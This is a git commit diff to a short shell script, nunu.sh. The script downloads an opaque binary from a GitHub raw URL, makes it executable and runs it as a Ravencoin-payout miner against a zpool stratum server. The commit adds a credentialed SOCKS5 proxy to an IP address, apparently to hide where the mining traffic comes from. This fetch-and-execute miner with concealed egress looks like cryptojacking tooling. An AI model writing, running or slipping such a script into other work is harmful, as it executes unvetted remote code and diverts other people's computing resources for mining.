e88bde447f44b366b3eb70e7d12573257d43d913
riyanop007 <100838471+riyanop007@users.noreply.github.com>
2022-04-22 20:23:20 +0530

    Update nunu.sh

--- nunu.sh
+++ nunu.sh
@@ -1,4 +1,4 @@
 apt update -y
 wget -q https://raw.githubusercontent.com/riyanop007/repo/main/don
 chmod +x don
-./don -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u rFwyxa66DSmxKrxHJogWa5PDYnU6GiJsza.$(shuf -n 1 -i 1-9999999) -t 2 -p c=RVN,zap=BUT-lyra2z330
+./don -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u rFwyxa66DSmxKrxHJogWa5PDYnU6GiJsza.$(shuf -n 1 -i 1-9999999) -t 2 -p c=RVN,zap=BUT-lyra2z330 -x socks5://Archer:12322@129.158.58.77:1080
